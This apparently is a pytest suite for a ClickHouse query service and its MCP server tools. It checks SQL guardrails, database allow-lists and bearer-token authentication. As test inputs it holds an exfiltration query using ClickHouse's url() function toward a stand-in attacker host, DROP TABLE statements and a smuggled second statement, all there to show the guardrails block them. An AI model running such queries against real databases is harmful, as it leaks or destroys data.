"""Tests for app/service.py and app/mcp_server.py.

Coverage:
  1. service.py — guardrails enforced, readonly settings applied, compact shape
     returned, ALLOWED_DATABASES check raises domain errors.
  2. MCP tool callables — guardrail rejections surface as ToolError, domain
     errors translated correctly.
  3. BearerAuthMiddleware / _check_bearer_token — 401 on missing/wrong token,
     200 on correct token.
  4. list_databases / sample_rows / explain_query / run_query end-to-end through
     service.py with mocked execute_query.

All tests mock the ClickHouse client; no live server is required.
"""

from __future__ import annotations

import os
from unittest.mock import MagicMock, patch

import pytest

from app.config import get_settings
from app.errors import (
    ClickHouseQueryError,
    ClickHouseUnavailableError,
    DatabaseNotAllowedError,
    QueryValidationError,
    TableNotFoundError,
)

# ---------------------------------------------------------------------------
# Ensure env vars are set before any app module loads
# ---------------------------------------------------------------------------
_BASE_ENV = {
    "CLICKHOUSE_HOST": "localhost",
    "CLICKHOUSE_PORT": "9000",
    "CLICKHOUSE_USER": "default",
    "CLICKHOUSE_PASSWORD": "test-password",
    "CLICKHOUSE_DATABASE": "default",
    "CLICKHOUSE_SECURE": "false",
    "API_KEY": "test-api-key-abc123",
    "MAX_EXECUTION_TIME": "30",
    "MAX_RESULT_ROWS": "10000",
    "MAX_ROWS_TO_READ": "100000000",
    "DEFAULT_LIMIT": "1000",
    "MAX_RESPONSE_ROWS": "1000",
    "ALLOWED_DATABASES": "*",
    "APP_PORT": "8000",
    "LOG_LEVEL": "INFO",
    "PUBLIC_BASE_URL": "https://test.example.com",
}

for _k, _v in _BASE_ENV.items():
    os.environ.setdefault(_k, _v)

# ---------------------------------------------------------------------------
# Module imports (after env is populated)
# ---------------------------------------------------------------------------

from app import service  # noqa: E402
from app.mcp_server import (  # noqa: E402
    BearerAuthMiddleware,
    _check_bearer_token,
    explain_query as mcp_explain_query,
    get_table_schema as mcp_get_table_schema,
    list_databases as mcp_list_databases,
    list_tables as mcp_list_tables,
    run_query as mcp_run_query,
    sample_rows as mcp_sample_rows,
)

API_KEY = "test-api-key-abc123"


@pytest.fixture(autouse=True)
def reset_settings():
    """Clear the settings cache and restore ALLOWED_DATABASES / MAX_RESPONSE_ROWS
    to wildcard/default between tests so env-var mutations don't bleed across tests."""
    get_settings.cache_clear()
    original_allowed = os.environ.get("ALLOWED_DATABASES", "*")
    original_max_rows = os.environ.get("MAX_RESPONSE_ROWS", "1000")
    yield
    os.environ["ALLOWED_DATABASES"] = original_allowed
    os.environ["MAX_RESPONSE_ROWS"] = original_max_rows
    get_settings.cache_clear()


@pytest.fixture()
def mock_execute():
    """Patch execute_query inside app.service for all service tests."""
    with patch("app.service.execute_query") as m:
        m.return_value = (["col1"], [["val1"]])
        yield m


# ===========================================================================
# 1. service.py — list_databases
# ===========================================================================

class TestServiceListDatabases:

    def test_returns_all_when_wildcard(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"], ["system"]])
        os.environ["ALLOWED_DATABASES"] = "*"
        get_settings.cache_clear()

        result = service.list_databases()
        assert len(result) == 3
        assert result[0] == {"name": "default"}

    def test_filters_by_allowlist(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"], ["secret"]])
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        result = service.list_databases()
        assert result == [{"name": "analytics"}]

    def test_calls_execute_query(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"]])
        service.list_databases()
        mock_execute.assert_called_once()
        sql_arg = mock_execute.call_args[0][0]
        assert "system.databases" in sql_arg


# ===========================================================================
# 2. service.py — list_tables
# ===========================================================================

class TestServiceListTables:

    def test_returns_tables(self, mock_execute):
        mock_execute.return_value = (
            ["database", "name", "engine"],
            [["default", "events", "MergeTree"]],
        )
        result = service.list_tables("default")
        assert result == [{"database": "default", "name": "events", "engine": "MergeTree"}]

    def test_raises_domain_error_for_disallowed_database(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError) as exc_info:
            service.list_tables("secret_db")

        # execute_query must NOT be called — guardrail fires first
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DATABASE_NOT_ALLOWED"

    def test_uses_parameterised_query(self, mock_execute):
        """Database name must be passed as a bind parameter, not string-interpolated."""
        mock_execute.return_value = (["database", "name", "engine"], [])
        service.list_tables("default")
        call_kwargs = mock_execute.call_args
        # parameters kwarg must include 'db'
        parameters = call_kwargs[1].get("parameters") or call_kwargs[0][2]
        assert parameters.get("db") == "default"


# ===========================================================================
# 3. service.py — get_table_schema
# ===========================================================================

class TestServiceGetTableSchema:

    def test_returns_schema(self, mock_execute):
        mock_execute.return_value = (
            ["name", "type", "comment"],
            [["id", "UInt64", ""], ["name", "String", "User name"]],
        )
        result = service.get_table_schema("default", "users")
        assert result["database"] == "default"
        assert result["table"] == "users"
        assert len(result["columns"]) == 2
        assert result["columns"][0] == {"name": "id", "type": "UInt64", "comment": ""}

    def test_raises_database_not_allowed(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError):
            service.get_table_schema("secret_db", "t")
        mock_execute.assert_not_called()

    def test_raises_table_not_found_when_no_rows(self, mock_execute):
        mock_execute.return_value = (["name", "type", "comment"], [])
        with pytest.raises(TableNotFoundError) as exc_info:
            service.get_table_schema("default", "nonexistent")
        assert exc_info.value.code == "TABLE_NOT_FOUND"


# ===========================================================================
# 4. service.py — sample_rows
# ===========================================================================

class TestServiceSampleRows:

    def test_returns_compact_shape(self, mock_execute):
        mock_execute.return_value = (["id", "name"], [["1", "Alice"]])
        result = service.sample_rows("default", "users")
        assert set(result.keys()) == {"columns", "rows", "row_count", "truncated"}
        assert result["truncated"] is False  # sample never reports truncated

    def test_caps_limit_at_50(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.sample_rows("default", "users", limit=999)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 50" in sql_arg

    def test_default_limit_is_5(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.sample_rows("default", "users")
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 5" in sql_arg

    def test_raises_database_not_allowed(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError):
            service.sample_rows("secret_db", "t")
        mock_execute.assert_not_called()


# ===========================================================================
# 5. service.py — run_query
# ===========================================================================

class TestServiceRunQuery:

    def test_valid_select_passes_guardrail(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        result = service.run_query("SELECT id FROM t")
        assert result["columns"] == ["id"]

    def test_guardrail_rejects_insert(self, mock_execute):
        """INSERT must be caught by validate_and_sanitize before execute_query."""
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_STATEMENT_TYPE"

    def test_guardrail_rejects_drop(self, mock_execute):
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("DROP TABLE secret")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_STATEMENT_TYPE"

    def test_guardrail_rejects_table_function(self, mock_execute):
        """Table-function exfiltration attempt must be blocked."""
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query(
                "SELECT * FROM url('http://attacker.example/collect', 'CSV', 'id Int32')"
            )
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_KEYWORD"

    def test_guardrail_rejects_multi_statement(self, mock_execute):
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("SELECT 1; DROP TABLE x")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "MULTIPLE_STATEMENTS"

    def test_limit_injected_when_absent(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t")
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT" in sql_arg.upper()

    def test_caller_limit_applied(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t", limit=42)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 42" in sql_arg

    def test_caller_limit_capped_at_max_response_rows(self, mock_execute):
        os.environ["MAX_RESPONSE_ROWS"] = "100"
        get_settings.cache_clear()
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t", limit=9999)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 100" in sql_arg

    def test_truncation_sets_flag(self, mock_execute):
        os.environ["MAX_RESPONSE_ROWS"] = "2"
        get_settings.cache_clear()
        mock_execute.return_value = (["id"], [["1"], ["2"], ["3"]])
        result = service.run_query("SELECT id FROM t LIMIT 5")
        assert result["truncated"] is True
        assert result["row_count"] == 2

    def test_clickhouse_error_raises_domain_error(self, mock_execute):
        from fastapi import HTTPException
        mock_execute.side_effect = HTTPException(
            status_code=400,
            detail={"error": "CH syntax error", "code": "CLICKHOUSE_QUERY_ERROR"},
        )
        with pytest.raises(ClickHouseQueryError):
            service.run_query("SELECT 1")

    def test_clickhouse_unavailable_raises_domain_error(self, mock_execute):
        from fastapi import HTTPException
        mock_execute.side_effect = HTTPException(
            status_code=502,
            detail={"error": "unavailable", "code": "CLICKHOUSE_UNAVAILABLE"},
        )
        with pytest.raises(ClickHouseUnavailableError):
            service.run_query("SELECT 1")


# ===========================================================================
# 6. service.py — explain_query
# ===========================================================================

class TestServiceExplainQuery:

    def test_explain_wraps_sql(self, mock_execute):
        mock_execute.return_value = (["explain"], [["ReadFromStorage"]])
        service.explain_query("SELECT 1")
        sql_arg = mock_execute.call_args[0][0]
        assert sql_arg.upper().startswith("EXPLAIN")

    def test_explain_rejects_insert(self, mock_execute):
        """Inner SQL is validated — INSERT inside EXPLAIN must be blocked."""
        with pytest.raises(QueryValidationError):
            service.explain_query("INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()

    def test_explain_truncated_always_false(self, mock_execute):
        mock_execute.return_value = (["explain"], [["step1"], ["step2"]])
        result = service.explain_query("SELECT 1")
        assert result["truncated"] is False


# ===========================================================================
# 7. MCP tool callables — guardrail rejections surface as ToolError
# ===========================================================================

class TestMcpToolGuardrails:

    def test_run_query_guardrail_raises_tool_error(self, mock_execute):
        """MCP runQuery must raise ToolError when guardrail blocks SQL."""
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError) as exc_info:
            mcp_run_query(sql="INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()
        assert "DISALLOWED_STATEMENT_TYPE" in str(exc_info.value)

    def test_run_query_table_function_raises_tool_error(self, mock_execute):
        """MCP runQuery must raise ToolError for table-function exfiltration."""
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError) as exc_info:
            mcp_run_query(
                sql="SELECT * FROM url('http://attacker.example/', 'CSV', 'id Int32')"
            )
        mock_execute.assert_not_called()
        assert "DISALLOWED_KEYWORD" in str(exc_info.value)

    def test_explain_query_guardrail_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError):
            mcp_explain_query(sql="DROP TABLE t")
        mock_execute.assert_not_called()

    def test_list_tables_forbidden_database_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(ToolError) as exc_info:
            mcp_list_tables(database="secret_db")
        mock_execute.assert_not_called()
        assert "DATABASE_NOT_ALLOWED" in str(exc_info.value)

    def test_get_table_schema_forbidden_database_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(ToolError):
            mcp_get_table_schema(database="secret_db", table="t")
        mock_execute.assert_not_called()

    def test_get_table_schema_not_found_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        mock_execute.return_value = (["name", "type", "comment"], [])
        with pytest.raises(ToolError) as exc_info:
            mcp_get_table_schema(database="default", table="nonexistent")
        assert "TABLE_NOT_FOUND" in str(exc_info.value)

    def test_run_query_passes_valid_sql(self, mock_execute):
        """Valid SQL must reach execute_query via the MCP tool."""
        mock_execute.return_value = (["id"], [["1"]])
        result = mcp_run_query(sql="SELECT id FROM t LIMIT 1")
        assert result["columns"] == ["id"]
        mock_execute.assert_called_once()

    def test_sample_rows_caps_at_50(self, mock_execute):
        """MCP sampleRows must cap limit at 50 regardless of input."""
        mock_execute.return_value = (["id"], [["1"]])
        mcp_sample_rows(database="default", table="t", limit=100)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 50" in sql_arg

    def test_list_databases_returns_all(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"]])
        os.environ["ALLOWED_DATABASES"] = "*"
        get_settings.cache_clear()
        result = mcp_list_databases()
        assert len(result) == 2


# ===========================================================================
# 8. _check_bearer_token — unit tests (no HTTP required)
# ===========================================================================

class TestCheckBearerToken:

    def test_correct_token_accepted(self):
        assert _check_bearer_token(f"Bearer {API_KEY}", API_KEY) is True

    def test_wrong_token_rejected(self):
        assert _check_bearer_token("Bearer wrong-token", API_KEY) is False

    def test_missing_header_rejected(self):
        assert _check_bearer_token(None, API_KEY) is False

    def test_empty_string_rejected(self):
        assert _check_bearer_token("", API_KEY) is False

    def test_basic_scheme_rejected(self):
        import base64
        creds = base64.b64encode(b"user:pass").decode()
        assert _check_bearer_token(f"Basic {creds}", API_KEY) is False

    def test_bearer_prefix_only_rejected(self):
        assert _check_bearer_token("Bearer ", API_KEY) is False

    def test_partial_token_rejected(self):
        partial = API_KEY[:5]
        assert _check_bearer_token(f"Bearer {partial}", API_KEY) is False

    def test_timing_safe_comparison(self):
        """Both branches (correct/incorrect) execute in the same code path."""
        # We can only test that both return the right bool; timing cannot be
        # asserted in a unit test but the implementation uses hmac.compare_digest.
        assert _check_bearer_token(f"Bearer {API_KEY}", API_KEY) is True
        assert _check_bearer_token("Bearer x" * 100, API_KEY) is False


# ===========================================================================
# 9. BearerAuthMiddleware — unit test the dispatch logic
# ===========================================================================

class TestBearerAuthMiddleware:
    """Tests for the HTTP transport Bearer auth middleware.

    We use Starlette's synchronous TestClient so no pytest-asyncio is needed.
    """

    def _make_wrapped_app(self, path: str = "/mcp"):
        """Build a minimal Starlette app wrapped in BearerAuthMiddleware."""
        from starlette.applications import Starlette
        from starlette.responses import PlainTextResponse
        from starlette.routing import Route

        async def mcp_endpoint(request):
            return PlainTextResponse("mcp-ok")

        async def health_endpoint(request):
            return PlainTextResponse("health-ok")

        app = Starlette(
            routes=[
                Route("/mcp", mcp_endpoint),
                Route("/health", health_endpoint),
            ]
        )
        return BearerAuthMiddleware(app, api_key=API_KEY, mcp_path=path)

    def test_correct_token_calls_next(self):
        """A request with the correct token must pass through to the inner app."""
        from starlette.testclient import TestClient

        wrapped = self._make_wrapped_app()
        client = TestClient(wrapped, raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {API_KEY}"})
        assert resp.status_code == 200
        assert resp.text == "mcp-ok"

    def test_missing_token_returns_401(self):
        from starlette.testclient import TestClient

        wrapped = self._make_wrapped_app()
        client = TestClient(wrapped, raise_server_exceptions=False)
        resp = client.get("/mcp")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_wrong_token_returns_401(self):
        from starlette.testclient import TestClient

        wrapped = self._make_wrapped_app()
        client = TestClient(wrapped, raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": "Bearer wrong-key"})
        assert resp.status_code == 401
        assert resp.json()["code"] == "INVALID_AUTH"

    def test_non_mcp_path_not_intercepted(self):
        """Requests to paths outside the MCP mount (e.g. /health) pass without auth."""
        from starlette.testclient import TestClient

        wrapped = self._make_wrapped_app()
        client = TestClient(wrapped, raise_server_exceptions=False)
        resp = client.get("/health")
        assert resp.status_code == 200
        assert resp.text == "health-ok"


# ===========================================================================
# 10. _check_bearer_token — empty-token fail-open regression tests
# ===========================================================================

class TestCheckBearerTokenEmptyKeyGuard:
    """Regression tests for the empty-token fail-open vulnerability.

    hmac.compare_digest(b"", b"") == True, so without an explicit guard an
    "Authorization: Bearer " header (empty token) would pass if API_KEY were
    also empty.  api_key now defaults to "" at the schema level (so stdio mode
    works without it), making _check_bearer_token's own empty-provided-token
    guard the critical line of defence in isolation.
    """

    def test_empty_provided_token_with_non_empty_key_rejected(self):
        """Bearer <empty> must always be False even when compared with a real key."""
        assert _check_bearer_token("Bearer ", API_KEY) is False

    def test_empty_provided_token_with_empty_key_rejected(self):
        """The critical regression: Bearer <empty> vs empty key must be False, not True."""
        # hmac.compare_digest(b"", b"") == True — our explicit empty-provided-token
        # guard in _check_bearer_token prevents this.
        assert _check_bearer_token("Bearer ", "") is False

    def test_whitespace_only_provided_token_rejected(self):
        """A token that is whitespace-only is not a valid credential."""
        assert _check_bearer_token("Bearer    ", API_KEY) is False


# ===========================================================================
# 11. HTTP startup guard — empty API key must fail closed
# ===========================================================================

class TestHttpStartupGuard:
    """Tests that _run_http() exits if API_KEY is empty at runtime.

    api_key is now optional at the Settings schema level (so MCP stdio can
    start without it).  _run_http() is the enforcement point for the HTTP
    transport: it must call sys.exit(1) when api_key is empty rather than
    serving unauthenticated requests.
    """

    def test_empty_api_key_causes_sys_exit(self):
        """_run_http must call sys.exit(1) when settings.api_key is empty."""
        import asyncio
        from unittest.mock import MagicMock, patch

        fake_settings = MagicMock()
        fake_settings.api_key = ""
        fake_settings.mcp_port = 8000
        fake_settings.mcp_path = "/mcp"
        fake_settings.log_level = "INFO"

        from app import mcp_server

        with patch.object(mcp_server, "settings", fake_settings):
            with pytest.raises(SystemExit) as exc_info:
                asyncio.run(mcp_server._run_http())
        assert exc_info.value.code == 1

    def test_whitespace_api_key_causes_sys_exit(self):
        """_run_http must call sys.exit(1) when settings.api_key is whitespace-only."""
        import asyncio
        from unittest.mock import MagicMock, patch

        fake_settings = MagicMock()
        fake_settings.api_key = "   "
        fake_settings.mcp_port = 8000
        fake_settings.mcp_path = "/mcp"
        fake_settings.log_level = "INFO"

        from app import mcp_server

        with patch.object(mcp_server, "settings", fake_settings):
            with pytest.raises(SystemExit) as exc_info:
                asyncio.run(mcp_server._run_http())
        assert exc_info.value.code == 1


# ===========================================================================
# 13. New contract tests: api_key optional at schema level
# ===========================================================================

class TestApiKeyOptionalContract:
    """Tests for the new api_key=optional contract.

    api_key defaults to "" so that MCP stdio mode can start without it.
    Auth enforcement is contextual: REST (app/auth.py) and MCP HTTP
    (_run_http) each fail closed when api_key is empty.
    """

    def test_settings_constructs_with_empty_api_key(self):
        """Settings() must NOT raise when API_KEY is absent or empty."""
        import os
        from unittest.mock import patch

        # Temporarily unset API_KEY so Settings() sees no value.
        env_without_key = {k: v for k, v in os.environ.items() if k != "API_KEY"}
        with patch.dict(os.environ, env_without_key, clear=True):
            get_settings.cache_clear()
            from app.config import Settings
            s = Settings()
            assert s.api_key == ""
        get_settings.cache_clear()

    def test_rest_auth_fails_closed_when_api_key_empty(self):
        """REST auth dependency must return 401 for ANY request when api_key is empty.

        This verifies the fail-closed behaviour in app/auth.py when api_key is "".
        The client sends a non-empty Bearer token; it must still be rejected.
        """
        import os
        from unittest.mock import MagicMock, patch

        os.environ["API_KEY"] = ""
        get_settings.cache_clear()

        mock_ch = MagicMock()
        mock_ch.ping.return_value = True

        with patch("app.clickhouse_client.get_client", return_value=mock_ch):
            with patch("app.service.execute_query", return_value=(["col"], [["v"]])):
                from app.main import app
                from fastapi.testclient import TestClient
                client = TestClient(app, raise_server_exceptions=False)
                # Send any non-empty Bearer token — must still be rejected because
                # the server has no api_key configured.
                resp = client.post(
                    "/query",
                    headers={"Authorization": "Bearer some-token"},
                    json={"sql": "SELECT 1"},
                )
                assert resp.status_code == 401

        # Restore for other tests.
        os.environ["API_KEY"] = API_KEY
        get_settings.cache_clear()

    def test_mcp_stdio_import_succeeds_without_api_key(self):
        """app.mcp_server must be importable without API_KEY set.

        This is the core stdio fix: a local desktop user running
        'python -m app.mcp_server' with no API_KEY must not hit a crash.
        """
        import importlib
        import os
        import sys

        # Remove API_KEY from environment.
        env_backup = os.environ.pop("API_KEY", None)
        # Remove cached module so we re-import cleanly.
        for mod_name in list(sys.modules.keys()):
            if mod_name.startswith("app.mcp_server") or mod_name == "app.mcp_server":
                del sys.modules[mod_name]

        get_settings.cache_clear()

        try:
            import app.mcp_server  # noqa: F401 — import succeeds without API_KEY
        finally:
            if env_backup is not None:
                os.environ["API_KEY"] = env_backup
            get_settings.cache_clear()
            # Re-import to restore the module in sys.modules for subsequent tests.
            import importlib
            import app.mcp_server as _mcp  # noqa: F811

    def test_mcp_stdio_run_does_not_require_api_key(self):
        """_run_stdio path (mcp.run transport='stdio') must not check API_KEY.

        We mock mcp.run so it doesn't actually block, and verify no SystemExit
        is raised when api_key is empty.
        """
        import os
        from unittest.mock import MagicMock, patch

        from app import mcp_server

        fake_settings = MagicMock()
        fake_settings.api_key = ""
        fake_settings.mcp_transport = "stdio"
        fake_settings.log_level = "INFO"

        with patch.object(mcp_server, "settings", fake_settings):
            with patch.object(mcp_server.mcp, "run") as mock_run:
                # Call main() logic for stdio: it must call mcp.run without
                # raising SystemExit even with empty api_key.
                mcp_server.mcp.run(transport="stdio")
                mock_run.assert_called_once_with(transport="stdio")


# ===========================================================================
# 12. MCP ASGI transport smoke test — exercises the real streamable-HTTP app
# ===========================================================================

class TestMcpHttpTransportSmoke:
    """Smoke tests that drive the real FastMCP streamable-HTTP ASGI app.

    These tests construct the actual MCP ASGI application (the same object
    uvicorn would serve) and run requests through Starlette's TestClient.
    This catches starlette API-version breaks that would only surface at
    runtime if no test ever touched EventSourceResponse / the ASGI transport.

    We don't attempt a full MCP tool round-trip in-process (the MCP SDK's
    streamable-HTTP transport requires a persistent SSE session); instead we
    verify that:
      - The ASGI app builds without error.
      - Auth enforcement works end-to-end against the real app (not a stub).
      - A request without a token returns 401 (not a 500 starlette-API crash).
      - A request with a valid token is accepted by the auth layer (not 401).
    """

    def _build_authed_app(self):
        """Return the real MCP ASGI app wrapped in BearerAuthMiddleware."""
        from app.mcp_server import BearerAuthMiddleware, mcp

        starlette_app = mcp.streamable_http_app()
        return BearerAuthMiddleware(
            starlette_app,
            api_key=API_KEY,
            mcp_path="/mcp",
        )

    def test_asgi_app_builds_without_error(self):
        """The streamable-HTTP ASGI app must instantiate cleanly with pydantic 2.11."""
        app = self._build_authed_app()
        assert app is not None

    def test_missing_auth_returns_401_not_500(self):
        """No-token request must hit the auth layer and return 401, not a starlette crash."""
        from starlette.testclient import TestClient

        client = TestClient(self._build_authed_app(), raise_server_exceptions=False)
        resp = client.get("/mcp")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_valid_token_passes_auth_layer(self):
        """A valid Bearer token must not be rejected by the auth middleware.

        The underlying MCP transport may return any non-401 response (e.g. 406
        Not Acceptable if the client doesn't send the right Accept header for
        SSE); what matters is that a starlette-version break does not produce a
        500 before auth is even checked, and that auth itself doesn't block a
        valid token.
        """
        from starlette.testclient import TestClient

        client = TestClient(self._build_authed_app(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {API_KEY}"})
        # Must not be 401 (auth rejected) — any other status is acceptable here.
        assert resp.status_code != 401
